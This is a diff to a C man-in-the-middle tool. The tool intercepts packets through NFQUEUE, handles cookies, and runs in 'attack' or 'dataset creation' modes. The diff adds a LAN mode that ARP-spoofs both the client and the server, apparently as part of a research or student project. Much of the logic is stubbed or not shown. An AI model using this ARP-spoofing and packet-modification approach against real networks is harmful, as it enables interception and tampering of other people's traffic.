@@ -10,6 +10,7 @@
 #include <fcntl.h>
 #include <pthread.h>
 #include <stdbool.h>
+#include <stdint.h>
 #include <arpa/inet.h>
 #include <linux/if_arp.h>
 #include <linux/if_ether.h>
@@ -19,15 +20,13 @@
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
+#include <time.h>
 #include <linux/netfilter.h>
+#include <pcap.h>
 #include <libnetfilter_queue/libnetfilter_queue.h>
 
 void extract_mode();
 void extract_network_config();
-void do_localhost_attack();
-void do_lan_attack();
-void do_internet_attack();
-void arp_spoofing(char *ip);
 
 // network
 void setup_nfq(struct nfq_handle **h, struct nfq_q_handle **qh);
@@ -46,8 +45,12 @@ Byte *cookie; //define the large with thre realloc function
 
 #define DIM_PAGE 4096
 
-char *ip_client = "127.0.0.1"; 
-char *ip_server = "127.0.0.1";
+char my_ip[INET_ADDRSTRLEN];
+char gateway_ip[INET_ADDRSTRLEN];
+char ip_client[INET_ADDRSTRLEN];
+char ip_server[INET_ADDRSTRLEN];
+//char *ip_client = "127.0.0.1"; 
+//char *ip_server = "127.0.0.1";
 int port_server = 5000;
 char network_config;
 char op_mode;
@@ -58,6 +61,7 @@ int main(int argc, char *argv[]) {
 
   pthread_t attack_thread;
   attack = false;
+ 
 
   if (argc < 3) {
     perror("Missing arguments! \n");
@@ -69,6 +73,22 @@ int main(int argc, char *argv[]) {
     op_mode = argv[1][1];
   }
 
+  /*
+  switch(op_mode) {
+    case 'd':
+      printf("Dataset creation mode selected! \n");
+      break;
+    case 'a':
+      printf("Attack mode selected! \n");
+      break;
+    default:
+      perror("Invalid operation mode! \n");
+      exit(EXIT_FAILURE);
+  }*/
+
+  // -l --> LocalHost
+  // -n --> client and server in the same NETWORK
+  // -i --> client in the same LAN and server outside
   if(argv[2][0] == '-'){
     network_config = argv[2][1];
   }
@@ -81,17 +101,44 @@ int main(int argc, char *argv[]) {
   
   printf("Operation mode: %c. Network config: %c \n", op_mode, network_config);
 
-  extract_mode();
-  extract_network_config(); 
+  //extract_network_config(); 
   catch_signals();
 
   pthread_create(&attack_thread, NULL, do_attack_thread, NULL);
   //variabili condizionali per sleep e risveglio del thread
 
   // selecting the operation mode
-  // -m --> LocalHost
-  // -l --> client and server in the same LAN
-  // -i --> client in the same LAN and server outside
+  switch(network_config){
+    case 'l':
+      strncpy(ip_client, "127.0.0.1", INET_ADDRSTRLEN);
+      strncpy(ip_server, "127.0.0.1", INET_ADDRSTRLEN);
+      printf("LocalHost network configuration selected \n");
+      break;
+    case 'n':
+      get_network_info(my_ip, gateway_ip);
+      //extract ip client by the passed arguments
+      if(argc < 5){
+        perror("Missing arguments!");
+        exit(EXIT_FAILURE);
+      }
+      strncpy(ip_client, argv[3], INET_ADDRSTRLEN);
+      strncpy(ip_server, argv[4], INET_ADDRSTRLEN);
+      printf("LAN network configuration selected \n");
+      arp_spoofing(ip_client, ip_server);
+      arp_spoofing(ip_server, ip_client);
+      break;
+    case 'i':
+      if(argc < 4){
+        perror("Missing arguments!");
+        exit(EXIT_FAILURE);
+      }
+      printf("Internet network configuration selected \n");
+      break;
+    default:
+      fprintf(stderr, "Invalid netowkr configuration flag! \n");
+  }
+
+  printf("Mio indirizzo ip: %s \n indirizzo ip default gateway: %s \n", my_ip, gateway_ip);
 
   printf("Starting MITM proxy \n");
 
@@ -101,30 +148,18 @@ int main(int argc, char *argv[]) {
   return 0;
 }
 
-//function to extrract the operating mode by operating mode parameter
-void extract_mode() {
-  
-  switch (op_mode) {
-  case 'd':
-    printf("Dataset creation mode selected! \n");
-    break;
-  case 'a':
-    printf("Attack mode selected! \n");
-    break;
-  default:
-    perror("Invalid operation mode! \n");
-    exit(EXIT_FAILURE);
-  }
-}
-
 //function to extrract the network configuration by network configuration parameter
 void extract_network_config() {
 
   switch (network_config) {
-  case 'm':
+  case 'l':
+    strncpy(ip_client, "127.0.0.1", INET_ADDRSTRLEN);
+    strncpy(ip_server, "127.0.0.1", INET_ADDRSTRLEN);
     printf("LocalHost network configuration selected \n");
     break;
-  case 'l':
+  case 'n':
+    get_network_info(my_ip, gateway_ip);
+    
     printf("LAN network configuration selected \n");
     break;
   case 'i':
@@ -133,18 +168,6 @@ void extract_network_config() {
   default:
     fprintf(stderr, "Invalid netowkr configuration flag! \n");
   }
-}
-
-void do_localhost_attack() {
-
-  // attaccante deve mettersi in ascolto sull'interfaccia di loopback
-  //
-  //
-}
-
-void arp_spoofing(char *ip) {
-
-  // chiama l'apposito tool per effettuare arp spoofing (in base a dove viene eseguit l'attacco)
 }
 
 //function to initialize nfq (NFQUEUE)
@@ -469,19 +492,17 @@ void send_modified_packet(){
   close(smp_fd);
 }
 
-//function to start the clock timer
-void start_timer(){
+void wait_server_reply(){
 
 
-}
 
-//function to stop the clock timer
-void stop_timer(){
 
 }
 
 //thread function to perform attack
 void *do_attack_thread(void *arg){
+
+  struct timespec start, stop;
 
   unsigned short checksum;
   while(1==1){
@@ -515,6 +536,13 @@ void *do_attack_thread(void *arg){
 
    
     send_modified_packet();
+    //clock_gettime(CLOCK_MONOTONIC, &start);
+
+
+    //attendo la ricezione del pacchetto
+
+
+    //clock_gettime(CLOCK_REALTIME, &stop);
 
     //start_timer(); (forse chiamata subito dentro send_modified_packet)
     //wait for response
